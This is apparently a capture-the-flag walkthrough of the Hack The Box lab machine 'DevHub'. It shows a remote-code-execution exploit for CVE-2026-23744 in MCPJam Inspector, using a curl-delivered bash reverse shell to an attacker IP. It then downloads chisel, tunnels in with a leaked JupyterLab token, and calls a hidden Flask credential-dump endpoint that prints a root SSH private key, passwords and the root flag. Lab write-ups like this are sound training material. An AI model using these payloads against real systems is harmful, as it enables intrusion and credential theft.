<div align="center">
<img src="attachments/Pasted%20image%2020260603155328.png">
</div>



[Machine Page]([https://app.hackthebox.com/machines/MonitorsFour?sort_by=created_at&sort_type=desc](https://app.hackthebox.com/machines/DevHub?sort_by=created_at&sort_type=desc))  
**Difficulty:** Medium  
**OS:** Linux 
**CVEs Exploited:** CVE-2026-23744
**Topics:** 

By: [https://app.hackthebox.com/users/2727685](https://app.hackthebox.com/users/2727685)

---

## Overview

DevHub is a Linux machine that begins with the discovery of a vulnerable MCPJam Inspector instance running on port 6274. Exploiting CVE-2026-23744 provides Remote Code Execution and a shell as `mcp-dev`. During local enumeration, a JupyterLab instance running as `analyst` is discovered on localhost and accessed through a Chisel reverse tunnel using a leaked authentication token. Reviewing the source code of an internal Flask application reveals a hidden administrative function capable of disclosing sensitive data, ultimately exposing the root user's SSH private key and leading to full system compromise.

---

## Reconnaissance

The challenge began with a full **TCP** port scan to identify exposed **services**.

```shell
$ nmap -sV -sC -p- --min-rate 10000 10.129.11.186
```

The scan identified three open TCP ports:  
  
- 22/tcp – OpenSSH 8.9p1 (Ubuntu)  
- 80/tcp – Nginx 1.18.0  
- 6274/tcp – Unknown HTTP service

Port 80 redirected to `devhub.htb`, as usual on HTB labs hostname-based routing is in use. As a result we add `devhub.htb` to our **local hosts file** for further investigation.

```shell
$ echo '10.129.11.186 devhub.htb' | sudo tee -a /etc/hosts 
```

The most interesting finding was the service running on port 6274. Although **nmap** was unable to identify it, manual inspection of the HTTP response revealed a web application titled **MCPJam Inspector**. The service responded to standard HTTP requests and exposed **CORS**-related headers, suggestinga modern web API or development-related application.

>[!NOTE]
>CORS (Cross-Origin Resource Sharing) headers are HTTP response headers that tell browsers whether a website is allowed to make requests to a resource hosted on a different origin (domain,port or protocol). 

Visiting `ttp://devhub.htb` shows a platform intended for Internal Use.

![](attachments/Pasted%20image%2020260602215343.png)

This confirms MCP Inspector on port 6274, gives hints on Analytics Dashboard we could access once we have access to localhost from inside the machine via RCE, and Code Repository once we have a more privileged user login maybe.

Visiting `http://devhub.htb:6274` shows the landing page of MCPJam.

![](attachments/Pasted%20image%2020260602220253.png)

Checking the settings reveals the version this service is running on: `MCPJam Version: v1.4.2`

Research into the identified MCPJam version revealed a known **Remote Code Execution (RCE)** vulnerability, assigned CVE-2026-23744.

---
## Exploiting CVE-2026-23744

(Further information on this vulnerability could be found [here](https://pentest-tools.com/vulnerabilities-exploits/mcpjam-inspector-remote-code-execution_28808))

A fragment from [this](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) documentation by the reporter **c2an1** explains it pretty well:

---
**Details** 

MCPJam inspector binds to `0.0.0.0` making its HTTP APIs remotely reachable.

```ts
const server = serve({
  fetch: app.fetch,
  port: SERVER_PORT,
  hostname: "0.0.0.0",
});
```

The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.

---

To receive the reverse shell, a Netcat listener was started on the attack host.

```shell
$ nc -lvnp 4444  
```

The **PoC** in the repo:

```
curl http://10.129.11.186:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"/-i >& /dev/tcp/10.10.16.29/4444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

Transform the command to enable a **Reverse Shell** from inside the server an run it:

```shell
curl http://10.129.11.186:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": [
        "-c",
        "bash -i >& /dev/tcp/10.10.16.29/4444 0>&1"
      ],
      "env": {}
    },
    "serverId": "mytest"
  }'
```

From our listener:

```shell
$ nc -lvnp 4444            
listening on [any] 4444 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.11.186] 54458
bash: cannot set terminal process group (1081): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
whoami
mcp-dev
```

Upgrade shell:

```bash
SHELL=/bin/bash script -q /dev/null

^Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

---
## Local Enumeration

A `server.py` file was discovered during enumeration. As there was no immediate way to interact with it, the file was noted in case we obtained the needed privileges.

```
mcp-dev@devhub:/opt$ cd opsmcp/
mcp-dev@devhub:/opt/opsmcp$ ls
server.py
mcp-dev@devhub:/opt/opsmcp$ file server.py
server.py: regular file, no read permission
mcp-dev@devhub:/opt/opsmcp$ ls -l
total 8
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
mcp-dev@devhub:/opt/opsmcp$ 

```

Process scanning reveals :

```shell
mcp-dev@devhub:~$ ps auxww | egrep -i 'node|jupyter|python|mcp|8888|5000'
root         897  0.0  0.4  32728 19672 ?        Ss   06:00   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
analyst     1062  0.0  2.4 181508 96568 ?        Ss   06:00   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
mcp-dev     1064  0.0  1.6 1512180 64768 ?       Ssl  06:00   0:00 npm start
root        1070  0.0  0.7  37376 28708 ?        Ss   06:00   0:03 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     1230  0.0  0.0   2892   992 ?        S    06:00   0:00 sh -c npx @mcpjam/inspector@1.4.2
mcp-dev     1235  0.0  2.4 1738496 96580 ?       Sl   06:00   0:04 npm exec @mcpjam/inspector@1.4.2
mcp-dev     1266  0.0  0.0   2892   972 ?        S    06:00   0:00 sh -c "inspector"
mcp-dev     1267  0.0  1.2 1442132 51732 ?       Sl   06:00   0:00 node /opt/mcpjam/node_modules/.bin/inspector
mcp-dev     1281  0.0  3.5 2225096 142524 ?      Sl   06:00   0:02 node /opt/mcpjam/node_modules/@mcpjam/inspector/dist/server/index.js
mcp-dev     1664  0.0  0.1   5688  4904 ?        S    08:52   0:00 bash -i
mcp-dev     1672  0.0  0.0   2808  1072 ?        S    08:54   0:00 script -q /dev/null
mcp-dev     1673  0.0  0.1   5792  5072 pts/0    Ss   08:54   0:00 bash -i
mcp-dev     1923  0.0  0.0   7064  1568 pts/0    R+   10:09   0:00 ps auxww
mcp-dev     1924  0.0  0.0   3604  1736 pts/0    S+   10:09   0:00 grep -E --color=auto -i node|jupyter|python|mcp|8888|5000

```

Exposed `--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

JupyterLab (PID 1062) -> Running as `analyst`

```
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
--ip=127.0.0.1 --port=8888
```

This is the biggest win. The token is exposed in the process args and Jupyter lets you execute arbitrary Python code.

Since we cant use **ssh forwarding** as it requires credentials which we dont have, I opted fr **chisel**.

First, a Chisel binary was transferred to the target and made executable:

```shell
wget http://10.10.16.29:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Alternatively:

```shell
curl http://10.10.16.29:8000/$(which chisel | xargs basename) -o /tmp/chisel && chmod +x /tmp/chisel
```

A reverse tunnel was then established (From the target machine):

```shell
/tmp/chisel client 10.10.16.29:9001 R:8888:127.0.0.1:8888
```

This configuration instructed the target to connect back to the Chisel server running on the attack host and expose its local JupyterLab service (`127.0.0.1:8888`) through port `8888` on the attack machine.

After browsing to `http://127.0.0.1:8888`

![](attachments/Pasted%20image%2020260603125520.png)

The token discovered in the process list was supplied, granting access to the JupyterLab environment running as the `analyst` user.
 
![](attachments/Pasted%20image%2020260603142618.png)

---
## User flag

Navigating to the "Other" section and launching a terminal instance provided an interactive shell as the analyst user.

![](attachments/Pasted%20image%2020260603142856.png)

The shell instance spawned by JupyterLab allows the usage of arrow keys, has auto-completion by pressing tab and seems overall stable, so continuing to work from here is a considerable option.

---
## Priv esc

Since we now finally have the analyst user, we can return back to `/opt/opsmcp/server.py`

```shell
analyst@devhub:/opt/opsmcp$ cat server.py 
```

```python
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

Key findings:

```python
# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
```

```python
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

It reveals everything needed. It runs on `127.0.0.1:5000`, the API key is hard coded `opsmcp_secret_key_4f5a6b7c8d9e0f1a`, and there's a hidden `ops._admin_dump`.

Run the file:

```shell
python3 server.py
``` 

```shell
analyst@devhub:/opt/opsmcp$ python3 server.py 
 * Serving Flask app 'server'
 * Debug mode: off
Address already in use
Port 5000 is in use by another progra
```

We get this error, the server is not able to start as the port 5000 is currently being occupied, instead of investigating what service is occupying this port, we can just `vim server.py` and change the port to `5555`.

Now run it again. Since we need to communicate to the server from the inside as it is listening to open port we can just open another shell instance directly from the JupyterLab browser

![](attachments/Pasted%20image%2020260603151513.png)

Testing to see if it works.

![](attachments/Pasted%20image%2020260603151611.png)

The server is up, now we supply the right request.

```shell
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

We get the root private ssh key dumped: 

```
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

Saved key should look like this:

```shell
$ cat /tmp/root_key
-----BEGIN OPENSSH PRIVATE KEY-----

b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----

```

What is left for us to do is to ssh in as **root**

```shell
$ ssh -i /tmp/root_key root@devhub.htb 
```

---
## Root flag

Root flag can be found in the home directory of the root user

```shell
root@devhub:~# ls
root.txt  snap
root@devhub:~# cat root.txt 
7ff6f229007a099a100eb3aad7973d75

```

---
## Summary

| Step | Action                           | Tool/Technique                    |
| ---- | -------------------------------- | --------------------------------- |
| 1    | Port scan                        | Nmap                              |
| 2    | Web reconnaissance               | Manual enumeration                |
| 3    | RCE on MCPJam                    | CVE-2026-23744                    |
| 5    | Exposed Authentication Token     | Process enumeration (`ps aux`)    |
| 6    | Lateral Movement                 | Chisel (reverse port forwarding)  |
| 7    | Gain code execution as `analyst` | JupyterLab terminal               |
| 8    | User Flag                        | Readable from `/home/analyst`     |
| 9    | Root SSH private key             | Hidden `ops._admin_dump` function |
| 10   | Root Flag                        | Readable from `/root`             |

---

![](attachments/Pasted%20image%2020260603175943.png)
